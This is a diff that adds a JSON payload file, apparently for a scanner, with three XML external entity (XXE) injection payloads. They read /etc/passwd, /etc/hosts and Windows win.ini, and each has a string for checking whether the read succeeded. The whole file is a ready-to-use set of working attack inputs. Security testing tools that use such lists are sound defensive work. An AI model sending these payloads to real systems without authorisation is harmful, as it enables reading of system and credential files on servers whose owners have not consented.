@@ -1,0 +1,7 @@
+{
+  "payloads": [
+    {"id": "etc-passwd", "name": "读取 /etc/passwd", "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "check": "root:"},
+    {"id": "etc-hosts", "name": "读取 /etc/hosts", "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>", "check": "localhost"},
+    {"id": "win-ini", "name": "读取 Windows win.ini", "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>", "check": "for 16-bit"}
+  ]
+}
